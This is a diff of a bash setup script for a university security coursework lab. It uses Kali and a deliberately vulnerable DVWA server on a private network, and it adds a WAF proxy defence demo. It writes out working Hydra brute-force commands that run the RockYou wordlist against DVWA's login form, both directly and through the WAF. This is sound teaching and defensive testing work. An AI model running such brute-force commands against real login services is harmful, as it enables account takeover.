@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================================
-# ELEC0138 CW1 — Lab Setup Commands
+# ELEC0138 CW1 & CW2 — Lab Setup Commands
 # Environment: VirtualBox on macOS (Apple Silicon M2)
 # Attacker: Kali Linux 2026.1 ARM64  (10.0.0.1)
 # Target:   Ubuntu Server 24.04 ARM64 (10.0.0.2)
@@ -92,21 +92,58 @@ nmap 10.0.0.2
 # 3.2 Nmap — service and version detection (save output)
 nmap -sV -sC -p 80 10.0.0.2 -oN nmap_scan.txt
 
-# 3.3 SQL Injection — Python script
-python3 sql_injection_demo.py
-# Results saved to: sql_injection_results.txt
-
-# 3.4 Unzip RockYou wordlist (if not already done)
+# 3.3 Unzip RockYou wordlist (if not already done)
 sudo gunzip /usr/share/wordlists/rockyou.txt.gz
 
-# 3.5 Get a valid DVWA session cookie (required to access the brute force vulnerability page)
+# 3.4 Get a valid DVWA session cookie (required to access the brute force vulnerability page)
 # Log into DVWA and retrieve the PHPSESSID from the browser:
 # Open Firefox on Kali → http://10.0.0.2/dvwa/login.php → login as admin/password
 # Open Inspector (F12) → Storage → Cookies → copy PHPSESSID value
 # Set security level to Low: DVWA Security tab → Low → Submit
 
-# 3.6 Hydra brute force against DVWA Brute Force vulnerability page (save output)
-# Replace PHPSESSID value below with the one copied from your browser session
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.2 \
-  http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<YOUR_PHPSESSID>;security=low:F=Username and/or password incorrect."
-# Result: 1 valid password found — admin:password
+# 3.5 Hydra brute force — CW1 (direct attack on DVWA, no WAF)
+# Replace <YOUR_PHPSESSID> with the value copied from your browser session
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.2 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<YOUR_PHPSESSID>;security=low:F=Username and/or password incorrect."
+# Result: 1 valid password found — admin:password (attempt 4 of 14,344,399)
+
+
+# ────────────────────────────────────────────────────────────
+# SECTION 4 — CW2 WAF DEPLOYMENT & DEFENCE DEMO (run on Kali)
+# ────────────────────────────────────────────────────────────
+
+# 4.1 Install Python dependencies for the WAF proxy
+pip install flask requests --break-system-packages
+
+# 4.2 Copy waf_proxy.py to Kali home directory (if not already there)
+# The file is in the repo root — adjust path as needed
+cp waf_proxy.py ~/waf_proxy.py
+
+# 4.3 Start the WAF proxy (runs on 0.0.0.0:5000, forwards to 10.0.0.2)
+# Keep this terminal open — the WAF must stay running during all CW2 demos
+python3 ~/waf_proxy.py
+
+# 4.4 Verify WAF is running — open in browser on Kali
+# http://10.0.0.1:5000/waf/dashboard
+# You should see the live security dashboard with all counters at 0
+
+# 4.5 Get a valid DVWA session cookie via the WAF
+# Open Firefox on Kali → http://10.0.0.1:5000/dvwa/login.php → login as admin/password
+# Open Inspector (F12) → Storage → Cookies → copy PHPSESSID value
+# Set security level to Low via: http://10.0.0.1:5000/dvwa/security.php
+
+# 4.6 Hydra brute force — CW2 (attack routed through WAF, targeting gordonb)
+# Replace <YOUR_PHPSESSID> with the value copied from step 4.5
+hydra -l gordonb -P /usr/share/wordlists/rockyou.txt 10.0.0.1 -s 5000 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<YOUR_PHPSESSID>;security=low:F=Username and/or password incorrect." -t 1 -V -f
+# Expected result: 0 valid passwords found — gordonb locked after 5 failures,
+# abc123 (position 10 in RockYou) blocked by WAF lockout layer.
+# Dashboard shows: 1 Lockout Event, 8 Failed Logins, 7 Rate Limited.
+
+# 4.7 Inspect the audit log — verify pseudonymised IP and event types
+grep "ACCOUNT_LOCKED" ~/waf_audit.log
+grep "SQLI_BLOCKED" ~/waf_audit.log
+grep "RATE_LIMITED" ~/waf_audit.log
+
+# 4.8 Reset WAF state between demo runs (via dashboard or curl)
+# Open browser → http://10.0.0.1:5000/waf/dashboard → click "Reset Stats & State"
+# Or via terminal:
+curl -X POST http://10.0.0.1:5000/waf/reset
